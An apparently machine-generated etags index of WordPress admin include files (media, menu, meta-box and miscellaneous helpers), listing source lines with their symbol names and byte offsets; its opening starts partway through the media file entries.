function get_upload_iframe_src( $type = null, $post_id = null, $tab = null ) {get_upload_iframe_src393,12017
function get_upload_iframe_src( $type = null, $post_id = null, $tab = null ) {type393,12017
		$post_id = $post_ID;post_id397,12141
	$upload_iframe_src = add_query_arg( 'post_id', (int) $post_id, admin_url('media-upload.php') );upload_iframe_src399,12165
		$upload_iframe_src = add_query_arg('type', $type, $upload_iframe_src);upload_iframe_src402,12297
		$upload_iframe_src = add_query_arg('tab', $tab, $upload_iframe_src);upload_iframe_src405,12395
	$upload_iframe_src = apply_filters($type . '_upload_iframe_src', $upload_iframe_src);upload_iframe_src407,12467
function media_upload_form_handler() {media_upload_form_handler419,12711
	$errors = null;errors422,12787
		$keys = array_keys($_POST['send']);keys425,12837
		$send_id = (int) array_shift($keys);send_id426,12875
	if ( !empty($_POST['attachments']) ) foreach ( $_POST['attachments'] as $attachment_id => $attachment ) {attachment_id429,12918
		$post = $_post = get_post($attachment_id, ARRAY_A);post430,13025
		$post_type_object = get_post_type_object( $post[ 'post_type' ] );post_type_object431,13079
		if ( isset($send_id) && $attachment_id == $send_id ) {attachment_id445,13631
		$post = apply_filters('attachment_fields_to_save', $post, $attachment);post450,13792
			$image_alt = get_post_meta($attachment_id, '_wp_attachment_image_alt', true);image_alt453,13910
				$image_alt = wp_strip_all_tags( stripslashes($attachment['image_alt']), true );image_alt455,14056
		$attachment = stripslashes_deep( $_POST['attachments'][$send_id] );attachment487,14929
		$html = isset( $attachment['post_title'] ) ? $attachment['post_title'] : '';html489,15000
			$rel = '';rel491,15117
				$rel = " rel='attachment wp-att-" . esc_attr($send_id) . "'";rel493,15240
			$html = "<a href='{$attachment['url']}'$rel>$html</a>";html494,15306
		$html = apply_filters('media_send_to_editor', $html, $send_id, $attachment);html497,15370
function wp_media_upload_handler() {wp_media_upload_handler511,15602
	$errors = array();errors512,15639
	$id = 0;id513,15659
		$id = media_handle_upload('async-upload', $_REQUEST['post_id']);id518,15801
			$id = false;id522,15948
		$src = $_POST['src'];src527,16017
			$src = "http://$src";src529,16087
			$title = esc_html( stripslashes( $_POST['title'] ) );title532,16189
				$title = esc_html( basename( $src ) );title534,16272
				$html = "<a href='" . esc_url($src) . "'>$title</a>";html537,16341
			$type = 'file';type539,16400
			if ( ( $ext = preg_replace( '/^.+?\.([^.]+)$/', '$1', $src ) ) && ( $ext_type = wp_ext2type( $ext ) )ext540,16419
					$type = $ext_type;type542,16582
			$html = apply_filters( $type . '_send_to_editor_url', $html, esc_url_raw( $src ), $title );html544,16607
			$align = '';align546,16713
			$alt = esc_attr( stripslashes( $_POST['alt'] ) );alt547,16729
				$align = esc_attr( stripslashes( $_POST['align'] ) );align549,16817
				$class = " class='align$align'";class550,16875
				$html = "<img src='" . esc_url($src) . "' alt='$alt'$class />";html553,16940
			$html = apply_filters( 'image_send_to_editor_url', $html, esc_url_raw( $src ), $alt, $align );html555,17009
		$return = media_upload_form_handler();return562,17179
			$errors = $return;errors567,17295
		$type = 'image';type576,17493
			$type = $_GET['type'];type578,17608
function media_sideload_image($file, $post_id, $desc = null) {media_sideload_image595,18128
function media_sideload_image($file, $post_id, $desc = null) {desc595,18128
		$tmp = download_url( $file );tmp598,18252
		$id = media_handle_sideload( $file_array, $post_id, $desc );id613,18716
		$src = wp_get_attachment_url( $id );src620,18906
		$alt = isset($desc) ? esc_attr($desc) : '';alt625,19050
		$html = "<img src='$src' alt='$alt' />";html626,19096
function media_upload_gallery() {media_upload_gallery638,19252
	$errors = array();errors639,19286
		$return = media_upload_form_handler();return642,19332
			$errors = $return;errors647,19448
function media_upload_library() {media_upload_library661,19664
	$errors = array();errors662,19698
		$return = media_upload_form_handler();return664,19743
			$errors = $return;errors669,19859
function image_align_input_fields( $post, $checked = '' ) {image_align_input_fields684,20144
function image_align_input_fields( $post, $checked = '' ) {checked684,20144
		$checked = get_user_setting('align', 'none');checked687,20229
	$alignments = array('none' => __('None'), 'left' => __('Left'), 'center' => __('Center'), 'right' => __('Right'));alignments689,20278
		$checked = 'none';checked691,20454
	$out = array();out693,20476
	foreach ( $alignments as $name => $label ) {name694,20493
		$name = esc_attr($name);name695,20539
		 	( $checked == $name ? " checked='checked'" : "" ) .checked697,20690
function image_size_input_fields( $post, $check = '' ) {image_size_input_fields712,21071
function image_size_input_fields( $post, $check = '' ) {check712,21071
		$size_names = apply_filters( 'image_size_names_choose', array('thumbnail' => __('Thumbnail'), 'medium' => __('Medium'), 'large' => __('Large'), 'full' => __('Full Size')) );size_names715,21228
			$check = get_user_setting('imgsize', 'medium');check718,21428
		foreach ( $size_names as $size => $label ) {size720,21480
			$downsize = image_downsize($post->ID, $size);downsize721,21527
			$checked = '';checked722,21576
			$enabled = ( $downsize[3] || 'full' == $size );enabled725,21626
			$css_id = "image-size-{$size}-{$post->ID}";css_id726,21677
			if ( $size == $check ) {size728,21800
					$checked = " checked='checked'";checked730,21848
					$check = '';check732,21895
				$check = $size;check735,22075
				$checked = " checked='checked'";checked736,22095
			$html = "<div class='image-size-item'><input type='radio' " . disabled( $enabled, false, false ) . "name='attachments[$post->ID][image-size]' id='{$css_id}' value='{$size}'$checked />";html739,22138
function image_link_input_fields($post, $url_type = '') {image_link_input_fields767,22940
function image_link_input_fields($post, $url_type = '') {url_type767,22940
	$file = wp_get_attachment_url($post->ID);file769,22999
	$link = get_attachment_link($post->ID);link770,23042
		$url_type = get_user_setting('urlbutton', 'post');url_type773,23109
	$url = '';url775,23163
	if ( $url_type == 'file' )url_type776,23175
		$url = $file;url777,23203
	elseif ( $url_type == 'post' )url_type778,23219
		$url = $link;url779,23251
function wp_caption_input_textarea($edit_post) {wp_caption_input_textarea789,23739
	$name = "attachments[{$edit_post->ID}][post_excerpt]";name791,23821
function image_attachment_fields_to_edit($form_fields, $post) {image_attachment_fields_to_edit805,24142
		$alt = get_post_meta($post->ID, '_wp_attachment_image_alt', true);alt807,24263
			$alt = '';alt809,24353
function media_single_attachment_fields_to_edit( $form_fields, $post ) {media_single_attachment_fields_to_edit844,25194
function media_post_single_attachment_fields_to_edit( $form_fields, $post ) {media_post_single_attachment_fields_to_edit858,25528
function image_attachment_fields_to_save($post, $attachment) {image_attachment_fields_to_save872,25821
function image_media_send_to_editor($html, $attachment_id, $attachment) {image_media_send_to_editor895,26464
	$post =& get_post($attachment_id);post896,26538
		$url = $attachment['url'];url898,26631
		$align = !empty($attachment['align']) ? $attachment['align'] : 'none';align899,26660
		$size = !empty($attachment['image-size']) ? $attachment['image-size'] : 'medium';size900,26733
		$alt = !empty($attachment['image_alt']) ? $attachment['image_alt'] : '';alt901,26817
		$rel = ( $url == get_attachment_link($attachment_id) );rel902,26892
function get_attachment_fields_to_edit($post, $errors = null) {get_attachment_fields_to_edit921,27338
function get_attachment_fields_to_edit($post, $errors = null) {errors921,27338
		$post =& get_post($post);post923,27424
		$post = (object) $post;post925,27476
	$image_url = wp_get_attachment_url($post->ID);image_url927,27503
	$edit_post = sanitize_post($post, 'edit');edit_post929,27552
	$form_fields = array(form_fields931,27597
		$t = (array) get_taxonomy($taxonomy);t967,28838
		$terms = get_object_term_cache($post->ID, $taxonomy);terms975,29024
			$terms = wp_get_object_terms($post->ID, $taxonomy, $t['args']);terms977,29103
		$values = array();values979,29171
	$form_fields = array_merge_recursive($form_fields, (array) $errors);form_fields990,29561
	$form_fields = apply_filters('attachment_fields_to_edit', $form_fields, $post);form_fields992,29632
function get_media_items( $post_id, $errors ) {get_media_items1010,30116
	$attachments = array();attachments1011,30164
		$post = get_post($post_id);post1013,30208
			$attachments = array($post->ID => $post);attachments1015,30289
			$attachments = get_children( array( 'post_parent' => $post_id, 'post_type' => 'attachment', 'orderby' => 'menu_order ASC, ID', 'order' => 'DESC') );attachments1017,30341
	$output = '';output1024,30669
	foreach ( (array) $attachments as $id => $attachment ) {id1025,30684
		if ( $item = get_media_item( $id, array( 'errors' => isset($errors[$id]) ? $errors[$id] : null) ) )item1028,30800
function get_media_item( $attachment_id, $args = null ) {get_media_item1044,31445
function get_media_item( $attachment_id, $args = null ) {args1044,31445
	if ( ( $attachment_id = intval( $attachment_id ) ) && $thumb_url = wp_get_attachment_image_src( $attachment_id, 'thumbnail', true ) )attachment_id1047,31524
		$thumb_url = $thumb_url[0];thumb_url1048,31659
		$thumb_url = false;thumb_url1050,31695
	$post = get_post( $attachment_id );post1052,31718
	$current_post_id = !empty( $_GET['post_id'] ) ? (int) $_GET['post_id'] : 0;current_post_id1053,31755
	$default_args = array( 'errors' => null, 'send' => $current_post_id ? post_type_supports( get_post_type( $current_post_id ), 'editor' ) : true, 'delete' => true, 'toggle' => true, 'show_title' => true );default_args1055,31833
	$args = wp_parse_args( $args, $default_args );args1056,32038
	$args = apply_filters( 'get_media_item_args', $args );args1057,32086
	$toggle_on  = __( 'Show' );toggle_on1060,32173
	$toggle_off = __( 'Hide' );toggle_off1061,32202
	$filename = esc_html( basename( $post->guid ) );filename1063,32232
	$title = esc_attr( $post->post_title );title1064,32282
	if ( $_tags = get_the_tags( $attachment_id ) ) {_tags1066,32324
		$tags = esc_attr( join( ', ', $tags ) );tags1069,32428
	$post_mime_types = get_post_mime_types();post_mime_types1072,32475
	$keys = array_keys( wp_match_mime_types( array_keys( $post_mime_types ), $post->post_mime_type ) );keys1073,32518
	$type = array_shift( $keys );type1074,32619
	$type_html = "<input type='hidden' id='type-of-$attachment_id' value='" . esc_attr( $type ) . "' />";type_html1075,32650
	$form_fields = get_attachment_fields_to_edit( $post, $errors );form_fields1077,32754
		$class = empty( $errors ) ? 'startclosed' : 'startopen';class1080,32838
		$toggle_links = "toggle_links1081,32897
		$class = '';class1085,33055
		$toggle_links = '';toggle_links1086,33070
	$display_title = ( !empty( $title ) ) ? $title : $filename; // $title shouldn't ever be empty, but just in casedisplay_title1089,33096
	$display_title = $show_title ? "<div class='filename new'><span class='title'>" . wp_html_excerpt( $display_title, 60 ) . "</span></div>" : '';display_title1090,33209
	$gallery = ( ( isset( $_REQUEST['tab'] ) && 'gallery' == $_REQUEST['tab'] ) || ( isset( $redir_tab ) && 'gallery' == $redir_tab ) );gallery1092,33355
	$order = '';order1093,33489
	foreach ( $form_fields as $key => $val ) {key1095,33504
				$order = "<div class='menu_order'> <input class='menu_order_input' type='text' id='attachments[$attachment_id][menu_order]' name='attachments[$attachment_id][menu_order]' value='" . esc_attr( $val['value'] ). "' /></div>";order1098,33599
				$order = "<input type='hidden' name='attachments[$attachment_id][menu_order]' value='" . esc_attr( $val['value'] ) . "' />";order1100,33834
	$media_dims = '';media_dims1107,34022
	$meta = wp_get_attachment_metadata( $post->ID );meta1108,34041
	$media_dims = apply_filters( 'media_meta', $media_dims, $post );media_dims1111,34307
	$image_edit_button = '';image_edit_button1113,34374
		$nonce = wp_create_nonce( "image_editor-$post->ID" );nonce1115,34457
		$image_edit_button = "<input type='button' id='imgedit-open-btn-$post->ID' onclick='imageEdit.open( $post->ID, \"$nonce\" )' class='button' value='" . esc_attr__( 'Edit Image' ) . "' /> <img src='" . esc_url( admin_url( 'images/wpspin_light.gif' ) ) . "' class='imgedit-wait-spin' alt='' />";image_edit_button1116,34513
	$attachment_url = get_permalink( $attachment_id );attachment_url1119,34812
	$item = "item1121,34865
	$defaults = array(defaults1148,35885
		$send = get_submit_button( __( 'Insert into Post' ), 'button', "send[$attachment_id]", false );send1156,36024
			$delete = "<a href='" . wp_nonce_url( "post.php?action=delete&amp;post=$attachment_id", 'delete-attachment_' . $attachment_id ) . "' id='del[$attachment_id]' class='delete'>" . __( 'Delete Permanently' ) . '</a>';delete1159,36222
			$delete = "<a href='#' class='del-link' onclick=\"document.getElementById('del_attachment_$attachment_id').style.display='block';return false;\">" . __( 'Delete' ) . "</a>delete1161,36469
			$delete = "<a href='" . wp_nonce_url( "post.php?action=trash&amp;post=$attachment_id", 'trash-attachment_' . $attachment_id ) . "' id='del[$attachment_id]' class='delete'>" . __( 'Move to Trash' ) . "</a>delete1167,37163
		$delete = '';delete1171,37585
	$thumbnail = '';thumbnail1174,37605
	$calling_post_id = 0;calling_post_id1175,37623
		$calling_post_id = absint( $_GET['post_id'] );calling_post_id1177,37680
		$calling_post_id = $post->post_parent;calling_post_id1179,37834
		$ajax_nonce = wp_create_nonce( "set_post_thumbnail-$calling_post_id" );ajax_nonce1182,38141
		$thumbnail = "<a class='wp-post-thumbnail' id='wp-post-thumbnail-" . $attachment_id . "' href='#' onclick='WPSetAsThumbnail(\"$attachment_id\", \"$ajax_nonce\");return false;'>" . esc_html__( "Use as featured image" ) . "</a>";thumbnail1183,38215
	$hidden_fields = array();hidden_fields1189,38668
	foreach ( $form_fields as $id => $field ) {id1191,38696
		$field = array_merge( $defaults, $field );field1200,38856
		$name = "attachments[$attachment_id][$id]";name1201,38901
		$required      = $field['required'] ? '<span class="alignright"><abbr title="required" class="required">*</abbr></span>' : '';required1208,39049
		$aria_required = $field['required'] ? " aria-required='true' " : '';aria_required1209,39178
		$class  = $id;class1210,39249
		$extra_rows = array();extra_rows1230,40403
			foreach ( $field['extra_rows'] as $class => $rows )class1237,40609
		foreach ( $extra_rows as $class => $rows )class1241,40740
	foreach ( $hidden_fields as $name => $value )name1251,41072
		$parent = (int) $_REQUEST['post_id'];parent1255,41287
		$parent_name = "attachments[$attachment_id][post_parent]";parent_name1256,41327
function media_upload_header() {media_upload_header1268,41575
function media_upload_form( $errors = null ) {media_upload_form1284,41896
function media_upload_form( $errors = null ) {errors1284,41896
	$upload_action_url = admin_url('async-upload.php');upload_action_url1292,42248
	$post_id = isset($_REQUEST['post_id']) ? intval($_REQUEST['post_id']) : 0;post_id1293,42301
	$_type = isset($type) ? $type : '';_type1294,42377
	$_tab = isset($tab) ? $tab : '';_tab1295,42414
	$upload_size_unit = $max_upload_size = wp_max_upload_size();upload_size_unit1297,42449
	$sizes = array( 'KB', 'MB', 'GB' );sizes1298,42511
	for ( $u = -1; $upload_size_unit > 1024 && $u < count( $sizes ) - 1; $u++ ) {u1300,42549
		$upload_size_unit = 0;upload_size_unit1305,42678
		$u = 0;u1306,42703
		$upload_size_unit = (int) $upload_size_unit;upload_size_unit1308,42723
$post_params = array(post_params1333,43332
$post_params = apply_filters( 'upload_post_params', $post_params ); // hook change! old name: 'swfupload_post_params'post_params1341,43486
$plupload_init = array(plupload_init1343,43605
$plupload_init = apply_filters( 'plupload_init', $plupload_init );plupload_init1360,44261
$large_size_h = absint( get_option('large_size_h') );large_size_h1367,44426
	$large_size_h = 1024;large_size_h1369,44501
$large_size_w = absint( get_option('large_size_w') );large_size_w1370,44524
	$large_size_w = 1024;large_size_w1372,44599
function media_upload_type_form($type = 'file', $errors = null, $id = null) {media_upload_type_form1420,46546
function media_upload_type_form($type = 'file', $errors = null, $id = null) {errors1420,46546
	$post_id = isset( $_REQUEST['post_id'] )? intval( $_REQUEST['post_id'] ) : 0;post_id1424,46650
	$form_action_url = admin_url("media-upload.php?type=$type&tab=type&post_id=$post_id");form_action_url1426,46730
	$form_action_url = apply_filters('media_upload_form_url', $form_action_url, $type);form_action_url1427,46818
	$form_class = 'media-upload-form type-form validate';form_class1428,46903
function media_upload_type_url_form($type = null, $errors = null, $id = null) {media_upload_type_url_form1483,48402
function media_upload_type_url_form($type = null, $errors = null, $id = null) {errors1483,48402
		$type = 'image';type1485,48505
	$post_id = intval($_REQUEST['post_id']);post_id1489,48550
	$form_action_url = admin_url("media-upload.php?type=$type&tab=type&post_id=$post_id");form_action_url1491,48593
	$form_action_url = apply_filters('media_upload_form_url', $form_action_url, $type);form_action_url1492,48681
	$form_class = 'media-upload-form type-form validate';form_class1493,48766
	insert : function() {insert1513,49391
	resetImageData : function() {resetImageData1555,50782
	updateImageData : function() {updateImageData1565,51163
	getImageData : function() {getImageData1574,51483
function media_upload_gallery_form($errors) {media_upload_gallery_form1618,52465
	$redir_tab = 'gallery';redir_tab1621,52539
	$post_id = intval($_REQUEST['post_id']);post_id1624,52589
	$form_action_url = admin_url("media-upload.php?type=$type&tab=gallery&post_id=$post_id");form_action_url1625,52631
	$form_action_url = apply_filters('media_upload_form_url', $form_action_url, $type);form_action_url1626,52722
	$form_class = 'media-upload-form validate';form_class1627,52807
function media_upload_library_form($errors) {media_upload_library_form1764,57320
	$post_id = intval($_REQUEST['post_id']);post_id1769,57461
	$form_action_url = admin_url("media-upload.php?type=$type&tab=library&post_id=$post_id");form_action_url1771,57504
	$form_action_url = apply_filters('media_upload_form_url', $form_action_url, $type);form_action_url1772,57595
	$form_class = 'media-upload-form validate';form_class1773,57680
	$start = ( $_GET['paged'] - 1 ) * 10;start1781,57920
		$start = 0;start1783,57978
$type_links = array();type_links1805,59041
$_num_posts = (array) wp_count_attachments();_num_posts1806,59064
$matches = wp_match_mime_types(array_keys($post_mime_types), array_keys($_num_posts));matches1807,59110
foreach ( $matches as $_type => $reals )_type1808,59197
	$class = ' class="current"';class1820,59732
	$class = '';class1822,59767
foreach ( $post_mime_types as $mime_type => $label ) {mime_type1824,59935
	$class = '';class1825,59990
		$class = ' class="current"';class1831,60182
$page_links = paginate_links( array(page_links1843,60675
$arc_query = "SELECT DISTINCT YEAR(post_date) AS yyear, MONTH(post_date) AS mmonth FROM $wpdb->posts WHERE post_type = 'attachment' ORDER BY post_date DESC";arc_query1859,61033
$arc_result = $wpdb->get_results( $arc_query );arc_result1861,61192
$month_count = count($arc_result);month_count1863,61241
		$default = ' selected="selected"';default1875,61689
		$default = '';default1877,61732
function wp_media_insert_url_form( $default_view = 'image' ) {wp_media_insert_url_form1931,63098
function wp_media_insert_url_form( $default_view = 'image' ) {default_view1931,63098
		$caption = 'caption1933,63212
		$caption = '';caption1942,63498
	$default_align = get_option('image_default_align');default_align1945,63519
		$default_align = 'none';default_align1947,63602
		$view = 'image-only';view1950,63665
		$table_class = '';table_class1951,63689
		$view = $table_class = 'not-image';view1953,63720
function _insert_into_post_button($type) {_insert_into_post_button2026,67765
function media_upload_flash_bypass() {media_upload_flash_bypass2055,68360
function media_upload_html_bypass() {media_upload_html_bypass2069,68705
function media_upload_text_after() {media_upload_text_after2078,69090
function media_upload_max_image_resize() {media_upload_max_image_resize2090,69395
	$checked = get_user_setting('upload_resize') ? ' checked="true"' : '';checked2091,69438
	$a = $end = '';a2092,69510
		$a = '<a href="' . esc_url( admin_url( 'options-media.php' ) ) . '" target="_blank">';a2095,69575
		$end = '</a>';end2096,69664

wordpress/wp-admin/includes/menu.php,2676
	if ( false !== $pos = strpos($menu_page[2], '?') ) {pos19,328
		$hook_name = substr($menu_page[2], 0, $pos);hook_name21,425
		$hook_args = substr($menu_page[2], $pos + 1);hook_args22,472
			$hook_name = $hook_args['post_type'];hook_name26,644
			$hook_name = basename($hook_name, '.php');hook_name28,692
		$hook_name = basename($menu_page[2], '.php');hook_name31,769
	$hook_name = sanitize_title($hook_name);hook_name33,820
		$hook_name = $compat[$hook_name];hook_name36,898
$_wp_submenu_nopriv = array();_wp_submenu_nopriv44,1050
$_wp_menu_nopriv = array();_wp_menu_nopriv45,1081
	foreach ($$sub_loop as $parent => $sub) {parent48,1234
		foreach ($sub as $index => $data) {index49,1277
foreach ( $menu as $id => $data ) {id67,1786
	$subs = $submenu[$data[2]];subs70,1868
	$first_sub = array_shift($subs);first_sub71,1897
	$old_parent = $data[2];old_parent72,1931
	$new_parent = $first_sub[2];new_parent73,1956
		foreach ($submenu[$old_parent] as $index => $data) {index80,2215
foreach ( $menu as $id => $data ) {id101,2900
		$subs = $submenu[$data[2]];subs108,3191
		$first_sub = array_shift($subs);first_sub109,3221
$separator_found = false;separator_found125,3590
foreach ( $menu as $id => $data ) {id126,3616
			$separator_found = true;separator_found129,3741
			$separator_found = false;separator_found132,3802
		$separator_found = false;separator_found135,3845
function add_cssclass($add, $class) {add_cssclass140,3898
	$class = empty($class) ? $add : $class .= ' ' . $add;class141,3936
function add_menu_classes($menu) {add_menu_classes145,4010
	$first = $lastorder = false;first147,4046
	$i = 0;i148,4076
	$mc = count($menu);mc149,4085
	foreach ( $menu as $order => $top ) {order150,4106
			$lastorder = 0;lastorder155,4271
			$first = true;first160,4370
			$c = $menu[$lastorder][4];c161,4388
			$c = $menu[$order][4];c167,4515
			$first = false;first169,4599
		if ( $mc == $i ) { // last itemmc172,4623
			$c = $menu[$order][4];c173,4657
		$lastorder = $order;lastorder177,4745
	$menu_order = array();menu_order186,4933
	$default_menu_order = $menu_order;default_menu_order191,5048
	$menu_order = apply_filters('menu_order', $menu_order);menu_order192,5084
	$menu_order = array_flip($menu_order);menu_order193,5141
	$default_menu_order = array_flip($default_menu_order);default_menu_order194,5181
	function sort_menu($a, $b) {sort_menu196,5238
		$a = $a[2];a198,5311
		$b = $b[2];b199,5325
$last_menu_key = array_keys( $menu );last_menu_key218,5891
$last_menu_key = array_pop( $last_menu_key );last_menu_key219,5929
$menu = add_menu_classes($menu);menu229,6274

wordpress/wp-admin/includes/meta-boxes.php,6226
function post_submit_meta_box($post) {post_submit_meta_box12,127
	$post_type = $post->post_type;post_type15,184
	$post_type_object = get_post_type_object($post_type);post_type_object16,216
	$can_publish = current_user_can($post_type_object->cap->publish_posts);can_publish17,271
	$preview_link = esc_url( get_permalink( $post->ID ) );preview_link41,1520
	$preview_button = __( 'Preview Changes' );preview_button42,1576
	$preview_link = get_permalink( $post->ID );preview_link44,1629
		$preview_link = str_replace( 'http://', 'https://', $preview_link );preview_link46,1691
	$preview_link = esc_url( apply_filters( 'preview_post_link', add_query_arg( 'preview', 'true', $preview_link ) ) );preview_link47,1762
	$preview_button = __( 'Preview' );preview_button48,1879
	$visibility = 'private';visibility115,4624
	$visibility_trans = __('Private');visibility_trans116,4650
	$visibility = 'password';visibility118,4732
	$visibility_trans = __('Password protected');visibility_trans119,4759
} elseif ( $post_type == 'post' && is_sticky( $post->ID ) ) {post_type120,4806
	$visibility = 'public';visibility121,4868
	$visibility_trans = __('Public, Sticky');visibility_trans122,4893
	$visibility = 'public';visibility124,4945
	$visibility_trans = __('Public');visibility_trans125,4970
<?php if ( $post_type == 'post' && current_user_can( 'edit_others_posts' ) ) : ?>post_type139,5908
$datef = __( 'M j, Y @ G:i' );datef157,7269
		$stamp = __('Scheduled for: <b>%1$s</b>');stamp160,7410
		$stamp = __('Published on: <b>%1$s</b>');stamp162,7560
		$stamp = __('Publish <b>immediately</b>');stamp164,7712
		$stamp = __('Schedule for: <b>%1$s</b>');stamp166,7877
		$stamp = __('Publish on: <b>%1$s</b>');stamp168,7973
	$date = date_i18n( $datef, strtotime( $post->post_date ) );date170,8018
	$stamp = __('Publish <b>immediately</b>');stamp172,8136
	$date = date_i18n( $datef, strtotime( current_time('mysql') ) );date173,8180
		$delete_text = __('Delete Permanently');delete_text196,8964
		$delete_text = __('Move to Trash');delete_text198,9013
function post_format_meta_box( $post, $box ) {post_format_meta_box241,10768
	$post_formats = get_theme_support( 'post-formats' );post_formats243,10924
		$post_format = get_post_format( $post->ID );post_format246,11018
			$post_format = '0';post_format248,11088
function post_tags_meta_box($post, $box) {post_tags_meta_box269,12080
	$defaults = array('taxonomy' => 'post_tag');defaults270,12123
		$args = array();args272,12225
		$args = $box['args'];args274,12250
	$tax_name = esc_attr($taxonomy);tax_name276,12330
	$taxonomy = get_taxonomy($taxonomy);taxonomy277,12364
	$disabled = !current_user_can($taxonomy->cap->assign_terms) ? 'disabled="disabled"' : '';disabled278,12402
	$comma = _x( ',', 'tag delimiter' );comma279,12493
function post_categories_meta_box( $post, $box ) {post_categories_meta_box311,14089
	$defaults = array('taxonomy' => 'category');defaults312,14140
		$args = array();args314,14242
		$args = $box['args'];args316,14267
	$tax = get_taxonomy($taxonomy);tax318,14347
				<?php $popular_ids = wp_popular_terms_checklist($taxonomy); ?>popular_ids329,14940
            $name = ( $taxonomy == 'category' ) ? 'post_category' : 'tax_input[' . $taxonomy . ']';name335,15096
function post_excerpt_meta_box($post) {post_excerpt_meta_box376,17430
function post_trackback_meta_box($post) {post_trackback_meta_box390,18004
	$form_trackback = '<input type="text" name="trackback_url" id="trackback_url" class="code" tabindex="7" value="'. esc_attr( str_replace("\n", ' ', $post->to_ping) ) .'" />';form_trackback391,18046
		$pings = '<p>'. __('Already pinged:') . '</p><ul>';pings393,18249
		$already_pinged = explode("\n", trim($post->pinged));already_pinged394,18303
function post_custom_meta_box($post) {post_custom_meta_box416,19126
$metadata = has_meta($post->ID);metadata421,19232
foreach ( $metadata as $key => $value ) {key422,19265
function post_comment_status_meta_box($post) {post_comment_status_meta_box440,19833
function post_comment_meta_box_thead($result) {post_comment_meta_box_thead459,20756
function post_comment_meta_box($post) {post_comment_meta_box471,20951
	$total = $wpdb->get_var($wpdb->prepare("SELECT count(1) FROM $wpdb->comments WHERE comment_post_ID = '%d' AND ( comment_approved = '0' OR comment_approved = '1')", $post_ID));total479,21276
	$wp_list_table = _get_list_table('WP_Post_Comments_List_Table');wp_list_table480,21453
		$hidden = get_hidden_meta_boxes( get_current_screen() );hidden486,21650
function post_slug_meta_box($post) {post_slug_meta_box508,22327
function post_author_meta_box($post) {post_author_meta_box521,22698
function post_revisions_meta_box($post) {post_revisions_meta_box541,23128
function page_attributes_meta_box($post) {page_attributes_meta_box554,23324
	$post_type_object = get_post_type_object($post->post_type);post_type_object555,23367
		$dropdown_args = array(dropdown_args557,23470
		$dropdown_args = apply_filters( 'page_attributes_dropdown_pages_args', $dropdown_args, $post );dropdown_args567,23787
		$pages = wp_dropdown_pages( $dropdown_args );pages568,23885
		$template = !empty($post->page_template) ? $post->page_template : false;template578,24251
function link_submit_meta_box($link) {link_submit_meta_box602,25147
function link_categories_meta_box($link) {link_categories_meta_box661,27263
function link_target_meta_box($link) { ?>link_target_meta_box707,28959
function xfn_check( $class, $value = '', $deprecated = '' ) {xfn_check732,30304
function xfn_check( $class, $value = '', $deprecated = '' ) {value732,30304
	$link_rel = isset( $link->link_rel ) ? $link->link_rel : ''; // In PHP 5.3: $link_rel = $link->link_rel ?: '';link_rel738,30481
	$rels = preg_split('/\s+/', $link_rel);rels739,30593
function link_xfn_meta_box($link) {link_xfn_meta_box760,31496
function link_advanced_meta_box($link) {link_advanced_meta_box878,39013
			for ( $r = 0; $r <= 10; $r++ ) {r897,40024
function post_thumbnail_meta_box() {post_thumbnail_meta_box915,40395
	$thumbnail_id = get_post_meta( $post->ID, '_thumbnail_id', true );thumbnail_id917,40447

wordpress/wp-admin/includes/misc.php,6929
function got_mod_rewrite() {got_mod_rewrite16,199
	$got_rewrite = apache_mod_loaded('mod_rewrite', true);got_rewrite17,228
function extract_from_markers( $filename, $marker ) {extract_from_markers30,573
	$result = array ();result31,627
	if ( $markerdata = explode( "\n", implode( '', file( $filename ) ) ));markerdata37,706
		$state = false;state39,781
				$state = false;state42,900
				$state = true;state46,1026
function insert_with_markers( $filename, $marker, $insertion ) {insert_with_markers67,1494
			$markerdata = '';markerdata70,1659
			$markerdata = explode( "\n", implode( '', file( $filename ) ) );markerdata72,1691
		$foundit = false;foundit78,1822
			$state = true;state80,1865
			foreach ( $markerdata as $n => $markerline ) {n81,1883
					$state = false;state83,1994
					$state = true;state96,2430
					$foundit = true;foundit97,2450
function save_mod_rewrite_rules() {save_mod_rewrite_rules122,2932
	$home_path = get_home_path();home_path128,3024
	$htaccess_file = $home_path.'.htaccess';htaccess_file129,3055
			$rules = explode( "\n", $wp_rewrite->mod_rewrite_rules() );rules135,3426
function iis7_save_url_rewrite_rules(){iis7_save_url_rewrite_rules151,3855
	$home_path = get_home_path();home_path157,3951
	$web_config_file = $home_path . 'web.config';web_config_file158,3982
		$rule = $wp_rewrite->iis7_url_rewrite_rules(false, '', '');rule162,4310
function update_recently_edited( $file ) {update_recently_edited179,4647
	$oldfiles = (array ) get_option( 'recently_edited' );oldfiles180,4690
		$oldfiles = array_reverse( $oldfiles );oldfiles182,4765
		$oldfiles = array_reverse( $oldfiles );oldfiles184,4830
		$oldfiles = array_unique( $oldfiles );oldfiles185,4872
function update_home_siteurl( $old_value, $value ) {update_home_siteurl202,5192
function url_shorten( $url ) {url_shorten221,5625
	$short_url = str_replace( 'http://', '', stripslashes( $url ));short_url222,5656
	$short_url = str_replace( 'www.', '', $short_url );short_url223,5721
	$short_url = untrailingslashit( $short_url );short_url224,5774
		$short_url = substr( $short_url, 0, 32 ) . '...';short_url226,5855
 * This function resets global variables based on the names passedresets233,5990
function wp_reset_vars( $vars ) {wp_reset_vars241,6233
	for ( $i=0; $i<count( $vars ); $i += 1 ) {i242,6267
		$var = $vars[$i];var243,6311
function show_message($message) {show_message264,6611
			$message = $message->get_error_message() . ': ' . $message->get_error_data();message267,6712
			$message = $message->get_error_message();message269,6800
function wp_doc_link_parse( $content ) {wp_doc_link_parse276,6912
	$tokens = token_get_all( $content );tokens283,7085
	$functions = array();functions284,7123
	$ignore_functions = array();ignore_functions285,7146
	for ( $t = 0, $count = count( $tokens ); $t < $count; $t++ ) {t286,7176
			// If it's a function or class defined locally, there's not going to be any docs availabledefined289,7382
			// If it's a function or class defined locally, there's not going to be any docs availableor289,7382
	$functions = array_unique( $functions );functions298,7808
	$ignore_functions = apply_filters( 'documentation_ignore_functions', $ignore_functions );ignore_functions300,7871
	$ignore_functions = array_unique( $ignore_functions );ignore_functions301,7962
	$out = array();out303,8019
function set_screen_options() {set_screen_options318,8283
		$option = $_POST['wp_screen_options']['option'];option325,8524
		$value = $_POST['wp_screen_options']['value'];value326,8575
		$option = str_replace('-', '_', $option);option331,8685
		$map_option = $option;map_option333,8730
		$type = str_replace('edit_', '', $map_option);type334,8755
		$type = str_replace('_per_page', '', $type);type335,8804
			$map_option = 'edit_per_page';map_option337,8894
			$map_option = 'edit_tags_per_page';map_option339,8972
				$value = (int) $value;value355,9447
				$value = apply_filters('set-screen-option', false, $option, $value);value360,9548
